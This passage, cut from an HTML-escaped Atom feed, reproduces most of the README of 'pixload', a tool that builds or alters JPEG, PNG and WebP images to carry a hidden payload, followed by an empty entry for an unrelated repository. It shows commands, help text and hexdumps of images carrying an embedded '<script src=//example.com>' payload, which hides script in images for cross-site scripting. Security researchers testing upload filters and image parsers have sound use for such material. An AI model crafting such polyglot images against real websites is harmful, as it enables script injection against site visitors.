successfully&#xA;&#xA;payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1&#xA;&#xA;00000000  ff d8 ff fe 00 25 3c 73  63 72 69 70 74 20 73 72  |.....%&amp;lt;script sr|&#xA;00000010  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com&amp;gt;|&#xA;00000020  3c 2f 73 63 72 69 70 74  3e ff db 00 43 00 01 01  |&amp;lt;/script&amp;gt;...C...|&#xA;00000030  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|&#xA;*&#xA;00000060  01 01 01 01 01 01 01 01  01 01 01 01 01 01 ff c2  |................|&#xA;00000070  00 0b 08 00 01 00 01 01  01 11 00 ff c4 00 14 00  |................|&#xA;00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|&#xA;0000009e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Inject payload into DQT table:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-jpg -S dqt payload.jpg&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ JPEG Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.jpg&#xA;&#xA;[&amp;gt;] Injecting payload into DQT table&#xA;[✔] Payload was injected succesfully&#xA;&#xA;payload.jpg: JPEG image data, progressive, precision 8, 1x1, components 1&#xA;&#xA;00000000  ff d8 ff db 00 43 00 01  01 01 01 01 01 01 01 01  |.....C..........|&#xA;00000010  01 01 01 01 01 01 01 01  01 01 01 01 01 01 01 01  |................|&#xA;00000020  01 01 01 01 3c 73 63 72  69 70 74 20 73 72 63 3d  |....&amp;lt;script src=|&#xA;00000030  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com&amp;gt;&amp;lt;/|&#xA;00000040  73 63 72 69 70 74 3e ff  c2 00 0b 08 00 01 00 01  |script&amp;gt;.........|&#xA;00000050  01 01 11 00 ff c4 00 14  00 01 00 00 00 00 00 00  |................|&#xA;00000060  00 00 00 00 00 00 00 00  00 03 ff da 00 08 01 01  |................|&#xA;00000070  00 00 00 01 3f ff d9 01  01 11 00 ff c4 00 14 00  |....?...........|&#xA;00000080  01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;00000090  03 ff da 00 08 01 01 00  00 00 01 3f ff d9        |...........?..|&#xA;0000009e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-jpg.1.pod&#34;&gt;pixload-jpg(1)&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-png&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-png --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-png [OPTION]... FILE&#xA;Hide Payload/Malicious Code in PNG Images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -W, --pixelwidth  INTEGER   set pixel width for the new image (default: 32)&#xA;  -H, --pixelheight INTEGER   set pixel height for the new image (default: 32)&#xA;  -P, --payload STRING        set payload for injection&#xA;  -v, --version               print version and exit&#xA;  -h, --help                  print help and exit&#xA;&#xA;If the output FILE already exists, then payload will be injected into this&#xA;existing file. Else, the new one will be created with specified pixels wide.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-png payload.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ PNG Payload Creator/Injector .........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.png&#xA;&#xA;[&amp;gt;] Injecting payload into payload.png&#xA;&#xA;[+] Chunk size: 13&#xA;[+] Chunk type: IHDR&#xA;[+] CRC: fc18eda3&#xA;[+] Chunk size: 9&#xA;[+] Chunk type: pHYs&#xA;[+] CRC: 952b0e1b&#xA;[+] Chunk size: 25&#xA;[+] Chunk type: IDAT&#xA;[+] CRC: c8a288fe&#xA;[+] Chunk size: 0&#xA;[+] Chunk type: IEND&#xA;&#xA;[&amp;gt;] Inject payload to the new chunk: &#39;pUnk&#39;&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.png: PNG image data, 32 x 32, 8-bit/color RGB, non-interlaced&#xA;&#xA;00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|&#xA;00000010  00 00 00 20 00 00 00 20  08 02 00 00 00 fc 18 ed  |... ... ........|&#xA;00000020  a3 00 00 00 09 70 48 59  73 00 00 0e c4 00 00 0e  |.....pHYs.......|&#xA;00000030  c4 01 95 2b 0e 1b 00 00  00 19 49 44 41 54 48 89  |...+......IDATH.|&#xA;00000040  ed c1 31 01 00 00 00 c2  a0 f5 4f ed 61 0d a0 00  |..1.......O.a...|&#xA;00000050  00 00 6e 0c 20 00 01 c8  a2 88 fe 00 00 00 00 49  |..n. ..........I|&#xA;00000060  45 4e 44 ae 42 60 82 00  00 00 00 00 00 00 00 00  |END.B`..........|&#xA;00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|&#xA;*&#xA;000000c0  00 23 50 55 6e 4b 3c 73  63 72 69 70 74 20 73 72  |.#PUnK&amp;lt;script sr|&#xA;000000d0  63 3d 2f 2f 65 78 61 6d  70 6c 65 2e 63 6f 6d 3e  |c=//example.com&amp;gt;|&#xA;000000e0  3c 2f 73 63 72 69 70 74  3e eb fd 2e 9f 00 49 45  |&amp;lt;/script&amp;gt;.....IE|&#xA;000000f0  4e 44                                             |ND|&#xA;000000f2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-png.1.pod&#34;&gt;pixload-png(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h3&gt;pixload-webp&lt;/h3&gt; &#xA;&lt;h5&gt;Help&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-webp --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage: pixload-webp [OPTION]... FILE&#xA;Hide payloads/malicious code in WebP images.&#xA;&#xA;Mandatory arguments to long options are mandatory for short options too.&#xA;  -P, --payload STRING   set payload for injection&#xA;  -v, --version          print version and exit&#xA;  -h, --help             print help and exit&#xA;&#xA;Currently, there is no possibility to inject the payload into an existing&#xA;WebP image. Only the new (minimal) WebP image will be created and your&#xA;payload will be injected into. If the output FILE already exists, the&#xA;payload will be injected into the existing image, but this image will be&#xA;corrupted.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Example&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;$ pixload-webp payload.webp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;........ WebP Payload Creator/Injector ........&#xA;...............................................&#xA;... https://github.com/chinarulezzz/pixload ...&#xA;...............................................&#xA;&#xA;[&amp;gt;] Generating output file&#xA;[✔] File saved to: payload.webp&#xA;&#xA;[&amp;gt;] Injecting payload into payload.webp&#xA;[✔] Payload was injected successfully&#xA;&#xA;payload.webp: RIFF (little-endian) data, Web/P image&#xA;&#xA;00000000  52 49 46 46 2f 2a 00 00  57 45 42 50 56 50 38 4c  |RIFF/*..WEBPVP8L|&#xA;00000010  ff ff ff 00 2f 00 00 00  10 07 10 11 11 88 88 fe  |..../...........|&#xA;00000020  07 00 2a 2f 3d 31 3b 3c  73 63 72 69 70 74 20 73  |..*/=1;&amp;lt;script s|&#xA;00000030  72 63 3d 2f 2f 65 78 61  6d 70 6c 65 2e 63 6f 6d  |rc=//example.com|&#xA;00000040  3e 3c 2f 73 63 72 69 70  74 3e 3b                 |&amp;gt;&amp;lt;/script&amp;gt;;|&#xA;0000004b&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/pixload-webp.1.pod&#34;&gt;pixload-webp(1)&lt;/a&gt; manual page for more information.&lt;/p&gt; &#xA;&lt;h2&gt;LICENSE&lt;/h2&gt; &#xA;&lt;p&gt;WTFPL. See &lt;a href=&#34;https://github.com/chinarulezzz/pixload/raw/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h2&gt;LEGAL DISCLAIMER&lt;/h2&gt; &#xA;&lt;p&gt;The author does not hold any responsibility for the bad use of this tool, remember that attacking targets without prior consent is illegal and punished by law.&lt;/p&gt; &#xA;&lt;h2&gt;DONATIONS&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;BTC: &lt;code&gt;bc1qj4g98svq6qh3q2ap37v52nsvusa76c3cnmcdmx&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;PAYPAL: &lt;code&gt;alexandr.savca89@gmail.com&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Highly appreciated.&lt;/p&gt; &#xA;&lt;!-- vim:sw=2:ts=2:sts=2:et:cc=80&#xA;End of file. --&gt;</summary>
  </entry>
  <entry>
    <title>ytnobody/PerlBeginners4-LT</title>
    <updated>2022-07-04T01:54:58Z</updated>
    <id>tag:github.com,2022-07-04:/ytnobody/PerlBeginners4-LT</id>
    <link href="https://github.com/ytnobody/PerlBeginners4-LT" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;</summary>
  </entry>
</feed>